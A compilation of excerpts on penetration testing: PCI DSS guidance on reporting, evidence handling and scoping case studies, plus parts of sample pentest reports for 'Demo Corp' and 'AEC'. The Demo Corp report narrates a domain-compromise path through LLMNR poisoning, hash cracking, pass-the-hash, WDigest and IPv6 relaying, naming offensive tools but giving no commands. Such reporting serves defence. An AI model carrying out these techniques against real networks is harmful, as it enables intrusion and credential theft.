    "text": "were not necessarily exploitable but which are deemed to pose a potential risk to the environment. It is recommended that the report contain any findings that impact the security posture of the assessed entity even in cases where exploitation did not occur. Some examples of identified vulnerabilities that were not exploited for valid reasons and should be included in the report may be:  Firewall misconfigurations that permit unauthorized traffic between secure and insecure zones  Detection of credentials obtained through manipulation of a web-application error message that was not flagged during an ASV scan due to a low CVSS base score 5.1.1 Assigning a Severity Score In order to prioritize remediation of the penetration test findings, it is a common practice during the reporting phase for a severity or risk ranking to be assigned for each detected security issue. The report should clearly document how the severity/risk ranking is derived. In most cases, severity/risk ranking may be applied as a result of evaluating an industry-standard score (e.g., NVD, CVSS) against a threshold or value that indicates risk (i.e., high, medium, and low). However, it should be noted that it is possible for a vulnerability to exist that is inherent to a particular environment; therefore, a standardized score is not available. When custom scoring is part of the risk-ranking process, the report should reflect a traceable set of reasoning for the modification of industry-standard scores or, where applicable, for the creation of a score for a vulnerability that does not have an industry-standard score defined. The intent of this document is to provide supplemental information. Information provided here does not 21\\n5.1.2 Industry Standard References Some well-known, industry-standard references include:  National Vulnerability Database (NVD)  Common Vulnerability Scoring System (CVSS)  Common Vulnerabilities and Exposure (CVE)  Common Weakness Enumeration (CWE)  Bugtraq ID (BID)  Open Source Vulnerability Database (OSVDB) The Common Vulnerability Scoring System (CVSS) is an example of an open framework that may be referenced for assigning a baseline risk rating. The CVSS is the required scoring system for Approved Scanning Vendors (ASVs) to use for ranking vulnerabilities detected during PCI vulnerability scans. Using this system, a standardized vulnerability score can be adjusted through the evaluation of the traits of vulnerability within the context of a specific environment. 5.2 Reporting Guidelines Comprehensive and consistent reporting is a critical phase of a penetration test. This section provides guidelines on common contents of an industry standard penetration test. It should be noted that these are only suggested outlines and do not define specific reporting requirements for PCI DSS penetration tests. Testers may have different sections, alternative titles, and/or report format, etc.; this outline represents data gathered from a number of penetration testing providers and the desires of customers. 5.2.1 Penetration Test Report Outline  Executive Summary Brief high-level summary of the penetration test scope and major findings o  Statement of Scope A detailed definition of the scope of the network and systems tested as part of o the",

All remediation efforts should be completed and retested within a reasonable period of time after the original penetration test report was provided.

A typical penetration test involves obtaining and evaluating evidence using a formal methodology; evidence collected from the penetration test is used to determine the conclusion. Evidence is considered all information that supports the penetration tester’s conclusions about the effectiveness of the security controls and the environment’s overall security posture. The penetration tester should follow a systematic process to securely collect, handle, and store evidence. Examples of evidence include but are not limited to screenshots, raw tool output (i.e., NMAP, burp suite, Nessus, TCPDump Wireshark, etc.), acquired dumps in case of exploitation (i.e., database files, logs, configuration files etc.), photos, recordings, and anything that may support the final conclusion of the penetration test report. It should be noted that if cardholder data is acquired during the penetration test, it is recommended that it be kept to a minimum. For example, a database full of cardholder data should not be dumped to the tester’s machine or system. 5.3.2 Retention It is recommended that procedures for retention and destruction of evidence be documented for all parties involved prior to commencing the penetration test. If a third party is used to perform the penetration test, contract language should be reviewed to confirm these procedures are clear. While there are currently no PCI DSS requirements regarding the retention of evidence collected by the penetration tester, it is a recommended best practice that such evidence be retained by the tester (whether internal to the organization or a third-party provider) for a period of time while considering any local, regional, or company laws that must be followed for the retention of evidence. This evidence should be available upon request from the target entity or other authorized entities as defined in the rules of engagement. If, however, a tester stores cardholder data obtained during the engagement, the data must be stored by the tester following the guidelines of the PCI DSS for the storage of account data—i.e., encrypted using strong cryptography, truncated/hashed, or not stored. Storage of account data by the tester is not recommended. This data should be securely wiped from tester systems at the conclusion of the engagement.

Client has three unique brands running on multiple e-commerce web sites. Brand A runs on a third-party e-commerce platform written using a Java platform with Apache Tomcat and IBM’s DB2 database and utilizes a content-delivery network for image distribution. Brand B and Brand C utilize an in-house coded e-commerce shopping cart written in ColdFusion with Microsoft SQL and share the same underlying code. All brands submit cardholder data for processing over HTTPS. All sites are hosted at a third-party hosting provider on dedicated systems. The Client’s firewalls have integrated intrusion prevention features. Client has exclusive control of the code and the content. Product Managers update product information using staging servers in the corporate environment, and the updates are promoted to production by IT support staff. Client has full control of DNS. Description of Environment The environment for Brands A, B, and C is comprised of five networks. The web DMZ contains the firewalls, DNS servers, load balancers, and web servers for all brands. Only the load balancers are NAT’d and have publicly routable IP addresses. The application tier contains the Apache Tomcat and ColdFusion middleware servers. It is segmented from the DMZ and database tiers using firewall access controls. The database tier contains the Microsoft SQL and IBM DB2 servers. It is segmented from the application tier using firewall access controls. The management network is used for backups, patch-management servers, NTP Servers, network-traffic analysis devices, and syslog collectors. The management network is accessible using jump boxes with two-factor authentication from the corporate network over a point-to-point VPN. Pre-Engagement Activities (Planning) Once the engagement is confirmed, the Pen Test Company scheduled a kick-off call and provided the Client with a testing questionnaire and test-authorization form to be completed before the next meeting. The kick-off call is generally used to review the rules of engagement, define the success criteria, and review the methodology to be used. An examination of this type could be conducted in accordance with information system security assessment best practices such as described by the Open Source Security Testing Methodology Manual (“OSSTMM”), The National Institute of Standards and Technology (“NIST”) Special Publication 800-115, Technical Guide to Information Security Testing and Assessment, or the Open Web Application Security Project (OWASP) testing methodology as defined in the OWASP Testing Guide v.3.0.

The intent of this document is to provide supplemental information. Information provided here does not 27\\nScoping is critical, and the more complex the environment, the more difficult it becomes. In this case, all external IPs used for the DMZ and web tier were included in the scope. This would include all systems that directly store, process, or transmit cardholder data. Because the Client has full control and full responsibility for its security, the DNS server was included in the scope of the test to determine whether an attacker could compromise the server and redirect traffic intended for the Client’s sites to a malicious intermediary or fraudulent site. The image CDN servers were determined out of scope because no PAN data is transmitted or processed and the systems are otherwise fully segmented. The staging systems are unavailable from the Internet and therefore cannot be tested. The web applications for Brand A and Brand B will be completely in scope. The web application for Brand C is presumed to be an exact copy, exclusive of product information and look and feel. The tester will sample the web application for Brand C to verify that the applications are the same as Brand B. If it is determined that there are material differences between Brand B and Brand C web applications, Brand C will be brought fully into scope. The Client and Pen Test Company have agreed that testing will be conducted against the production systems, as no suitable staging or review system is publicly available. Because of this limitation, testing must be performed with the intrusion prevention system enabled. However, because the timeline for testing cannot accommodate the time required to use techniques that might bypass the IPS, the Client has agreed to remove any blocks enabled by the system during testing. For this engagement the Client has requested that additional rules of engagement include that testing be limited to non-peak hours, and any attempts to run exploit code on the remote systems be performed only after notifying the Client. Also, any accounts created by the tester or successful orders placed in the system must be identified at the end of each day’s testing. All parties have agreed that no further testing is required if the penetration tester is able to extract data from either of the databases or obtain shell access on any server in the web farm. Engagement Phase (Discovery and Attack/Execution) The penetration tester began by comparing the scope provided by the Client with the latest ASV report to ensure they agreed on the assets and targets under examination. Any differences in scope were noted and investigated. The penetration tester then gathered information on the target organization through web sites and mail servers, public records, and databases. This open-source intelligence",

The penetration tester then gathered information on the target organization through web sites and mail servers, public records, and databases. This open-source intelligence (OSINT) gathering is an important next step in confirming scope and determining that all the appropriate assets have been included in the test. Newly discovered assets were vetted by the Client to determine whether they should be included in the penetration test. During this phase of the assessment, an additional disaster recovery site was identified in DNS, and Client confirmed this to be a warm backup in the event of failure of the primary sites. All relevant assets were added to the scope. The intent of this document is to provide supplemental information. Information provided here does not 28\\nOnce the assets were confirmed, the penetration tester enumerated the publicly available services provided by the targets. The tester actively tried to obtain usernames, network-share information, and application- version information of all running services and applications. In this phase, the penetration tester began to spider and map the applications, with and without credentials, in preparation for the exploitation phase. The tester was provided with the ability to complete a full transaction all the way through checkout and order confirmation. With target enumeration complete, the tester performed vulnerability mapping of identified services using automated tools and by comparing the port and service fingerprint against well-known vulnerability databases. This produced a list of unconfirmed vulnerabilities that were further examined in the exploitation phase of testing. The exploitation phase included tests and techniques designed to meet the objectives of the test. (These must be exploitive and may also be used to confirm the effectiveness of ancillary security controls such as intrusion detection systems or web application firewalls.) It was during this step that testing of the applications for issues related to the OWASP Top 10 and other web application frameworks took place. The final phase of testing included post-exploitation techniques. The term “post-exploitation” refers to the actions taken after the initial compromise of a system or device. It often describes the methodical approach of using privilege escalation techniques to gain additional access to systems or network resources. The extent to which post-exploitation techniques were performed were defined prior to the start of test to prevent the tester from putting production systems at risk of destabilization. Main vulnerabilities identified were: High:  Apache Tomcat Manager Application Deployer Authenticated Code Execution  Cross-site scripting (reflective)  Directory traversal Medium:  Deprecated protocols - SSLv2, SSLv3  SSL weak ciphers  Internal IP address disclosure Low:  IPS not enabled for disaster-recovery site  Slow HTTP denial-of-service attack Post-Engagement (Post-Execution Phase) At the completion of this examination, the penetration tester met with the Client to describe the preliminary results of the test and address any immediate concerns in advance of the report.

It was noted that the denial-of-service attack and missing IPS, while serious issues for a retailer, were not PCI-relevant findings and would not be required in order to obtain a clean report. The Client corrected all High and Medium-severity vulnerabilities within a 90-day window and the Pen Test Company provided documentation of successful remediation to the Client. 6.2 Hosting Provider Penetration Test Case Study Case Introduction PCIData Hosting is a hosting service provider. The only cardholder data environment that exists within PCIData Hosting belongs to its PCI DSS compliant customer, TechMerchant. TechMerchant is operating an e-commerce web environment on the PCIData hosting hardware. TechMerchant is solely responsible for the administration and maintenance of all the software and applications used to support its e-commerce environment. PCIData Hosting is bound by contract with TechMerchant to maintain PCI Compliance. PCIData Hosting is required to maintain PCI Compliance by TechMerchant since PCIData Hosting provides critical security services to TechMerchant for its PCI DSS compliance. In addition, PCIData Hosting has a wish to extend this type of PCI DSS hosting service to more customers in the payment card industry. PCIData Hosting is managing the systems in the cardholder data environment and is responsible for physical security, hardware, network, firewalls, and OS including updates, configuration etc. Applications and databases are not the responsibility of PCIData Hosting. Storing, processing, and transmitting cardholder data are in TechMerchant’s scope and have been described and assessed in its own PCI DSS Assessment. PCIData Hosting has no type of cardholder data transactions in scope, and the only entity hosted from a PCI perspective is TechMerchant, for whom they only provide hardware hosting services and logical system management. Description of Environment The environment at PCIData Hosting consists of five different networks:  ODIN Network Zone: Only VMware Hypervisors used for the TechMerchant CDE servers and environment are hosted in this network segment. This network is not accessible from the THOR network.  THOR Network Zone: This network is the CDE environment where TechMerchant has its virtual servers located; all servers located at this network are in PCI scope. The network is separated into smaller networks: DMZ, secure database zone, and an application zone. These networks are included in the penetration test performed",

This network is only used to manage non- CDE servers.  BALDER: All other clients are hosted on this network, including PCIData Hosting’s own office network. All networks are separated by firewalls, and access to ODIN and THOR network segments is restricted to two-factor authentication. The only wireless network is connected to LOKE (the guest network). The datacenter is located at PCIData Hosting’s location and is also in scope for PCI compliance. High-Level Network Diagram Success Criteria – The success criteria for the penetration test is to gain access to the CDE. Resource List (CDE environment)  ODIN – VMware servers  THOR – UNIX-based servers including webservers; Oracle databases in a secure zone  All employees at PCIData Hosting use Microsoft-based workstations to access the CDE environment. Pre-Engagement Actives (Planning) The methodology used for the penetration test was based on NIST SP800-115; the penetration test included the following phases: Planning, Discovery, Attack/Execution, Post-Execution and Reporting. The intent of this document is to provide supplemental information. Information provided here does not 31\\nThe planning phase was used to gather information needed for the assessment execution—such as the assets to be assessed, the threats of interest against the assets, and the security controls to be used to mitigate those threats—and to develop the assessment approach. The networks ODIN (VMware) and THOR (CDE Servers) are the targets of the penetration test as these servers are those that store, process, and transmit cardholder data. Scoping Discussion It was discussed with PCIData Hosting how they managed their CDE environment, including servers and databases. The operating systems are administrated by PCIData Hosting; all applications and development are handled by TechMerchant. Both PCIData Hosting and TechMerchant administer databases. Encrypted information in the database is only accessible with the encryption keys that are held by TechMerchant. All access to ODIN and THOR are authenticated by a two-factor solution. This also applies when accessed from internal networks at PCIData Hosting. TechMerchant’s last penetration test was reviewed to make sure that all perimeters, servers, etc. were covered by the tests. The application was tested as a part of the TechMerchant’s annual PCI penetration test and is not considered in scope for PCIData Hosting’s PCI penetration test, therefore the focus is network- layer testing.

The following documentation was reviewed before the assessment:  A network diagram  Results from quarterly external and internal vulnerability scans  Results from the last penetration test  The scope of the TechMerchant’s last penetration test  Security policies  Review of PCIData Hosting’s risk analysis. The following tests were performed during the assessment:  Internal penetration tests from LOKE (guest network), HEJMDAL (management network) and from the office network located in BALDER (Client).  Social engineering against PCIData Hosting administrators of ODIN (VMware) and THOR (CDE servers) in form of phishing e-mails  Physical security assessment as a part of the penetration test.  External testing of PCIData Hosting of their external IP-addresses.

Information provided here does not 32\\nPre-Test Preparations A user account was created for the penetration tester following the regular procedures for granting access to new employees. Access credentials for the guest network were also granted to the tester. Engagement Phase (Discovery and Attack/Execution) Discovery was performed on the LOKE (guest), HEJMDAL (management) and BALDER (office) networks to identify targets (servers, network components, workstations, etc.) on the networks, and analyzing techniques were used to get an understanding of the environment. The objectives of this phase were to identify systems, ports, services, and potential vulnerabilities. This phase was performed both manually and via automated tools including network discovery and port and service detection. When enough data was collected in the discovery phase, the penetration tester tried to gain access to the targets discovered. When access was gained to targets the tester tried to escalate privileges in order to gain complete control of the target. The access obtained was then used to gain more information about the environment, and a new discovery phase was started. The primary goal for the discovery and attack/execution was gaining access to the CDE, including the VMware hosts. The techniques used included password cracking, vulnerability scanning, social engineering, and network-layer testing. The above was completed for the following different perspectives during the assessment:  External attacker without knowledge of the environment  Internal attacker (guest, contractor, etc.)  Internal attacker (employee without access to the CDE) The following tests were performed during the assessment:  External attacker without knowledge of the environment External VPN connection was tested. o Phishing e-mails were sent to carefully selected victims who all are working with administrating o the CDE environment.

Information provided here does not 33\\nVulnerabilities were found on the different networks, and the tester was able to exploit these but was not able to use the vulnerabilities to gain access to ODIN or THOR. Main vulnerabilities identified were:  Man in the middle – It was possible to perform a man-in-the-middle attack using ARP poisoning but the tester was not able to extract any sensitive information that could provide information on how to gain access to ODIN or THOR.  Weak password policy implemented – Weak password settings on local servers on the BALDER network were used to compromise accounts on this network. The tester was not able to use these accounts to gain access to ODIN or THOR. As these servers are not in PCI scope, the weak password policy was not considered to have an impact on compliance.  Old user accounts were compromised – The tester was able to compromise user accounts that were created but had never been in use on the BALDER network. The compromised accounts did not grant access to ODIN or THOR.  Others – Other vulnerabilities were noted as zone transfer, outdated software, unencrypted protocols used; these vulnerabilities were all related to LOKE or BALDER network and did not grant access to ODIN or THOR even when exploited. Post-Engagement (Post-Execution phase) The post-execution phase focused on analyzing the identified vulnerabilities to determine root causes, establish recommendations and/or remediation activities, and develop a final report where all vulnerabilities noted during the test were documented even though they did not have an impact on the cardholder data environment. The penetration test report was presented to the Client and it was discussed how the Client could remediate the vulnerabilities noted during the penetration test. It was confirmed that none of the vulnerabilities had an effect on the cardholder data environment. As no significant vulnerabilities related to the CDE environment were discovered and access to the CDE environment was not obtained, remediation testing was not performed.

Corporate has a persistent VPN connection into each of the store locations to allow for administration of networked resources, accessing CCTV recordings, and checking inventory. Description of Environment The environment at Green Clothing consists of six store locations and one corporate office. All stores were determined to be identically configured and have been segmented into two networks:  POS Network – Cardholder Data Environment (CDE) 2 POS devices o 1 POS server o  General Store Network (Non-CDE) 1 manager workstation o 1 CCTV server o Corporate is made up of two network segments:  Corporate General User Network (Non-CDE) 4 workstations o 1 wireless access point o  Corporate IT Management Network (Non-CDE) o 3 workstations used to manage CDE servers The intent of this document is to provide supplemental information. Information provided here does not 35\\nDescription of Access The table below outlines the access from all non-CDE networks into the CDE.

All testing performed is based on the NIST SP 800-115 Technical Guide to Information Security Testing and Assessment, OWASP Testing Guide (v4), and customized testing frameworks. Phases of penetration testing activities include the following: • Planning – Customer goals are gathered and rules of engagement obtained. • Discovery – Perform scanning and enumeration to identify potential vulnerabilities, weak areas, and exploits. • Attack – Confirm potential vulnerabilities through exploitation and perform additional discovery upon new access. • Reporting – Document all found vulnerabilities and exploits, failed attempts, and company strengths and weaknesses. Assessment Components Internal Penetration Test An internal penetration test emulates the role of an attacker from inside the network. An engineer will scan the network to identify potential host vulnerabilities and perform common and advanced internal network attacks, such as: LLMNR/NBT-NS poisoning and other man- in-the-middle attacks, token impersonation, kerberoasting, pass-the-hash, golden ticket, and more. The engineer will seek to gain access to hosts through lateral movement, compromise domain user and admin accounts, and exfiltrate sensitive data. Demo Corp BUSINESS CONFIDENTIAL Page 5 of 38\\nFinding Severity Ratings The following table defines levels of severity and corresponding CVSS score range that are used throughout the document to assess vulnerability and risk impact. CVSS V3 Severity Definition Score Range Exploitation is straightforward and usually results in system-level Critical 9.0-10.0 compromise. It is advised to form a plan of action and patch immediately. Exploitation is more difficult but could cause elevated privileges and High 7.0-8.9 potentially a loss of data or downtime. It is advised to form a plan of action and patch as soon as possible. Vulnerabilities exist but are not exploitable or require extra steps such Moderate 4.0-6.9 as social engineering. It is advised to form a plan of action and patch after high-priority issues have been resolved. Vulnerabilities are non-exploitable but would reduce an organization’s Low 0.1-3.9 attack surface. It is advised to form a plan of action and patch during the next maintenance window. No vulnerability exists. Additional information is provided regarding Informational N/A items noticed during testing, strong controls, and additional documentation. Risk Factors Risk is measured by two factors: Likelihood and Impact: Likelihood Likelihood measures",

Client Allowances Demo Corp provided TCMS the following allowances: • Internal access to network via dropbox and port allowances Demo Corp BUSINESS CONFIDENTIAL Page 7 of 38\\nExecutive Summary TCMS evaluated Demo Corp’s internal security posture through penetration testing from February 22nd, 2021 to March 5th, 2021. The following sections provide a high-level overview of vulnerabilities discovered, successful and unsuccessful attempts, and strengths and weaknesses. Scoping and Time Limitations Scoping during the engagement did not permit denial of service or social engineering across all testing components. Time limitations were in place for testing. Internal network penetration testing was permitted for ten (10) business days. Testing Summary The network assessment evaluated Demo Corp’s internal network security posture. From an internal perspective, the TCMS team performed vulnerability scanning against all IPs provided by Demo Corp to evaluate the overall patching health of the network. The team also performed common Active Directory based attacks, such as Link-Local Multicast Name Resolution (LLMNR) Poisoning, SMB relaying, IPv6 man-in-the-middle relaying, and Kerberoasting. Beyond vulnerability scanning and Active Directory attacks, the TCMS evaluated other potential risks, such as open file shares, default credentials on servers/devices, and sensitive information disclosure to gain a complete picture of the network’s security posture. The TCMS team discovered that LLMNR was enabled in the network (Finding IPT-001), which permitted the interception of user hashes via LLMNR poisoning. These hashes were taken offline and cracked via dictionary attacks, which signals a weak password policy (Finding IPT-005). Utilizing the cracked passwords, the TCMS team gained access to several machines within the network, which indicates overly permissive user accounts. With machine access, and the use of older operating systems in the network (Finding IPT-009), the team was able to leverage WDigest (Finding IPT-003) to recover cleartext credentials to accounts. The team was also able to dump local account hashes on each machine accessed. The TCMS team discovered that the local account hashes were being re-used across devices (Finding IPT-002), which lead to additional machine access through pass-the-hash attacks. Ultimately, the TCMS team was able to leverage accounts captured through WDigest and hash dumps to move laterally throughout",

The TCMS team discovered that the local account hashes were being re-used across devices (Finding IPT-002), which lead to additional machine access through pass-the-hash attacks. Ultimately, the TCMS team was able to leverage accounts captured through WDigest and hash dumps to move laterally throughout the network until landing on a machine that had a Domain Administrator credential in cleartext via WDigest. The testing team was able to use this credential to log into the domain controller and compromise the entire domain. For a full walkthrough of the path to Domain Admin, please see Finding IPT-025. Demo Corp BUSINESS CONFIDENTIAL Page 8 of 38\\nIn addition to the compromise listed above, the TCMS team found that users could be impersonated through delegation attacks (Finding IPT-004), SMB relay attacks were possible due to SMB signing being disabled (Finding IPT-007), and IPv6 traffic was not restricted, which could lead to LDAPS relaying and domain compromise (Finding IPT-006). The remainder of critical findings relate to patch management as devices with critical out-of-date software (Finding IPT-008), operating systems (Finding IPT-009), and Microsoft RCE vulnerabilities (Findings IPT-010, IPT-011, IPT-012, IPT-013), were found to be present within the network. The remainder of the findings were high, moderate, low, or informational. For further information on findings, please review the Technical Findings section. Tester Notes and Recommendations Testing results of the Demo Corp network are indicative of an organization undergoing its first penetration test, which is the case here. Many of the findings discovered are vulnerabilities within Active Directory that come enabled by default, such as LLMNR, IPv6, and Kerberoasting. During testing, two constants stood out: a weak password policy and weak patching. The weak password policy led to the initial compromise of accounts and is usually one of the first footholds an attacker attempts to use in a network. The presence of a weak password policy is backed up by the evidence of our testing team cracking over 2,200 user account passwords, including a majority of the Domain Administrator accounts, through basic dictionary attacks. We recommended that Demo Corp re-evaluates their current password policy and considers a policy of 15 characters or more for their regular user accounts and 30 characters or more for their Domain Administrator accounts. We also recommend that Demo Corp explore password blacklisting and will be supplying a list of cracked user passwords for the team to evaluate. Finally, a Privilege Access Management solution should be considered. Weak patching and dated operating systems led to the compromise of dozens of machines within the network. We believe the number of compromised machines would have been significantly larger, however the TCMS and Demo Corp teams agreed it was not necessary to attempt to exploit any remote code execution (RCE) based vulnerabilities, such as MS17-010 (Finding IPT-012), as the domain controller had already been compromised and the teams did not want to risk any denial of service through failed attacks. We recommend that the Demo Corp team review the patching recommendations made",

We recommend that the Demo Corp team review the patching recommendations made in the Technical Findings section of the report along with reviewing the provided Nessus scans for a full overview of items to be patched. We also recommend that Demo Corp improve their patch management policies and procedures to help prevent potential attacks within their network. Demo Corp BUSINESS CONFIDENTIAL Page 9 of 38\\nOn a positive note, our testing team triggered several alerts during the engagement. The Demo Corp Security Operations team discovered our vulnerability scanning and was alerted when we attempted to use noisy attacks on a compromised machine. While not all attacks were discovered during testing, these alerts are a positive start. Additional guidance on alerting and detection has been provided for findings, when necessary, in the Technical Findings section. Overall, the Demo Corp network performed as expected for a first-time penetration test. We recommend that the Demo Corp team thoroughly review the recommendations made in this report, patch the findings, and re-test annually to improve their overall internal security posture.

Demo Corp BUSINESS CONFIDENTIAL Page 12 of 38\\nTechnical Findings Internal Penetration Test Findings Finding IPT-001: Insufficient LLMNR Configuration (Critical) Description: Demo Corp allows multicast name resolution on their end-user networks. TCMS captured 20 user account hashes by poisoning LLMNR traffic and cracked 2 with commodity cracking software. The cracked accounts were used to leverage further access that led to the compromise of the Domain Controller. Risk: Likelihood: High – This attack is effective in environments allowing multicast name resolution. Impact: Very High – LLMNR poisoning permits attackers to capture password hashes to either crack offline or relay in real-time and pivot laterally in the environment.

If multicast name resolution is required, Network Access Control (NAC) combined with application whitelisting can limit these attacks. Demo Corp BUSINESS CONFIDENTIAL Page 13 of 38\\nFinding IPT-002: Security Misconfiguration – Local Admin Password Reuse (Critical) Description: TCMS utilized local administrator hashes to gain access to other machines in the network via a ‘pass-the-hash’ attack. The local administrator hashes were obtained via machine access provided by the cracked account in IPT-001. Pass-the-hash attacks do not require knowing the account password to successfully log into a machine. Thus, reusing the same local admin password (and therefore the same hash) on multiple machines will permit system access to those computers. TCMS leveraged this attack to gain access to ~50 machines within the main office. This led to further account access and the eventual compromise of the domain controller. Risk: Likelihood: High – This attack is effective in large networks with local admin password reuse. Impact: Very High – Pass-the-hash permits an attacker to move laterally and vertically throughout the network. System: All Tools Used: Impacket, Crackmapexec References: https://capec.mitre.org/data/definitions/644.html https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security/ Evidence Figure 3: Local admin hash used to gain access to machine Remediation Utilize unique local admin passwords.

Demo Corp BUSINESS CONFIDENTIAL Page 14 of 38\\nFinding IPT-003: Security Misconfiguration – WDigest (Critical) Description: Demo Corp permitted out-of-date operating systems within their network, including Windows 7, 8, Server 2008, and Server 2012. These operating systems, by default, permit WDigest, which stores all current logged-in user’s passwords in clear-text. TCMS leveraged machine access gained in IPT-001 and IPT-002 to move laterally throughout the network until uncovering a machine with Domain Admin credentials stored in WDigest. Risk: Likelihood: Moderate – This attack is effective in networks with older operating systems. Impact: Very High – WDigests credentials are stored in clear text, which can permit the theft of sensitive accounts, such as Domain Administrators. System: All systems older than Windows 10 and Server 2016 Tools Used: Metasploit, Kiwi References: https://stealthbits.com/blog/wdigest-clear-text-passwords-stealing-more-than- a-hash/ Evidence Figure 4: Cleartext passwords of Domain Administrators Remediation Disable WDigest via GPO.

Demo Corp BUSINESS CONFIDENTIAL Page 16 of 38\\nFinding IPT-005: Insufficient Password Complexity (Critical) Description: TCMS dumped hashes from the domain controller and proceeded to attempt common password guessing attacks against all users. TCMS cracked 2,226 passwords using basic password list guessing attacks and low effort brute forcing attacks. 17 cracked accounts had domain administrator rights. Risk: Likelihood: High - Simple passwords are susceptible to password cracking attacks. Encryption provides some protection, but dictionary attacks base on common word lists often crack weak passwords. Impact: Very High - Domain admin accounts with weak passwords could lead to an adversary critically impacting Demo Corp ability to operate. System: All Tools Used: Manual Review References: NIST SP800-53 IA-5(1) - Authenticator Management https://www.cisecurity.org/white-papers/cis-password-policy-guide/ Evidence Figure 7: Excerpt of cracked domain hashes Remediation Implement CIS Benchmark password requirements / PAM solution. TCMS recommends that Demo Corp enforce industry best practices around password complexity and management. A password filter to prevent users from using common and easily guessable passwords is also recommended. Additionally, TCMS recommends that Demo Corp enforce stricter password requirements for Domain Administrator and other sensitive accounts. Demo Corp BUSINESS CONFIDENTIAL Page 17 of 38\\nFinding IPT-006: Security Misconfiguration – IPv6 (Critical) Description: Through IPv6 DNS poisoning, the TCMS team was able to successfully relay credentials to the Demo Corp domain controller. Risk: Likelihood: High – IPv6 is enabled by default on Windows networks. The tools and techniques required to perform this task are trivial. Impact: Very High - If exploited, an attacker can gain domain administrator access. System: All Tools Used: Mitm6, Impacket References: https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via- ipv6/ Evidence Figure 8: Successfully relayed LDAP credentials via mitm6 Remediation 1. IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments. If you do not use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of Allow prevents the attack from working: a. (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-In) b. (Inbound) Core Networking - Router Advertisement (ICMPv6-In) c. (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6- Out) 2. If WPAD is not in use internally, disable it via Group Policy",

The Technical Findings section expands upon the report overview by including each discovered vulnerability’s evaluated risk, exploitation details, and recommended remediation steps. Based upon the results of the assessment, AEC is at risk to be fined by payment providers due to severe PCI DSS violations. These fines could range from $5,000 to $100,000 per month depending on factors such as size of business [1]. Based on these issues, we suggest spending resources to become complaint. Details of all PCI DSS violations can be found in Section 2.3.1. New Haven Hacking Inc. was able to gain full access to a SCADA system using the default credentials. This device is extremely important as it is critical to industrial systems which operate the storage, delivery, and packaging warehouse facility. Similarly, the industrial control device is not isolated in any way, could be manipulated by any user on the network. It is important to take this with extreme caution, as malicious tampering with these devices couldresultinlossoflife. Thiswouldresultinunwantedattention, couldharmthecompanies reputation, and could cost AECvast sums of money from both lawsuits and long term loss of business. During this engagement, a total of 11 vulnerabilities were found in AEC’s network. In terms ofseverity, 3vulnerabilitiesarecritical, 3vulnerabilitiesarehigh, 1vulnerabilityismoderate, and 4 vulnerabilities posed low risk. Many of the vulnerabilities in the environment are due to improper authentication, default credentials, or not applying principles of least privileges. More information about these vulnerabilities can be found in Section 4. Page 2\\n1.2 Engagement Overview New Haven Hacking Inc. conducted a penetration test starting on January 7th, 2022 based upon the Request for Proposal (RFP) document obtained by New Haven Hacking Inc.. Focus was placed on the following goals during the engagement: • Assessing internally developed and customized software packages. • Assessment of Industrial controls within a storage, delivery, and packing warehouse facility. • Assessment of APIs related to payment, transaction, billing, and inventory processing systems. • Discovering vulnerabilities and complications which could impact the confidentiality, integrity, and availability (CIA) of AEC’s information systems. • Assisting AEC in improving their security posture. • Evaluate AEC’s security posture against the Payment Card Industry - Digital Security Standard (PCI-DSS). 1.3 Scope of Engagement The full scope of this penetration test was limited to the following CIDR range. At the request of AEC , the first day of the engagement (Jan 7 2022) excluded hosts 10.0.17.50 and 10.0.17.51 in order to ensure availability of critical infrastructure. These hosts were included on the second day (Jan 8th starting at 9:20AM) to ensure proper testing. Care was taken by New Haven Hacking Inc. to ensure penetration test activity did not reduce the availability of industrial systems. • 10.0.17.0/24 The penetration test was conducted with extreme care to ensure actions were contained within the defined scope. Additionally, because the engagement was within a production environment, the team ensured that no services were disrupted. New Haven Hacking Inc. did not exfiltrate, modify, or delete any data not included in this report.

The team is happy to continue a partnership with AEC and excited to work along side them in securing their operations. Page 3\\n2 Observations This section serves as a high level overview of the security posture of AEC. A detailed list of all discovered vulnerabilities can be found in Section 4. It is important to note that this list is by no means exhaustive and that there are most likely vulnerabilities that New Haven Hacking Inc. did not find. Improper Authentication Misconfigurations 1 3 Vulnerabilities 1 2 2 Default Credentials Data Exposures 2 Network Design Figure 1: Summary of Issues within the Network Default Credentials & Lack of authentication The most immediate observation about AEC’s security posture is that default, null, and passwordless authentication was discovered on multiple systems. New Haven Hacking Inc. was able to gain access into a SCADA system using the same credentials (which were default) as the last engagement. The system in question is critical to the storage, delivery, and packaging processes within the warehouse facility. Moreover, several databases contained this same issue and were found to not be requiring password authentication. It is important to remember these credentials are for critical services and PII. These weaknesses can have an enormous impact on AEC’s ability to operate if discovered by threat actors. These vulnerabilities can be remediated with low cost and have an outsized impact on the security of AEC. More details on mitigation for vulnerabilities such as these can be found in each vulnerability’s remediation suggestions in Section 4. Page 4\\n2.1 Summary of Recommendations The following is an overview of recommendations which should be implemented: • Resolve any PCI DSS compliance violations in Section 2.3.1 and ensure that AEC is currently meeting all documentation requirements set by PCI DSS. • Implement both ingress & egress filtering to reduce attack surface on hosts. • Ensure all hosts use least privilege principals to reduce attack surface. • Ensure proper encryption is used for confidential data (e.g. passwords and card holder data). • Implementation of a strong password policy. • Implement Multi-Factor authentication to provide defense in depth in addition to pass- words. • Uses centralized logging to be able to respond to potential incidents faster. • Ensure null or password-less authentication is not allowed. • Ensure only necessary services are running within the subnet. 2.2 Positive Security Measures As the engagement progressed, New Haven Hacking Inc. was impeded by the security safe- guards AEC had in place. A number of basic security best practices were observed that limited New Haven Hacking Inc.’s ability to move through the network. Some instances of aforementioned security practices implemented by AEC include: • The usage",

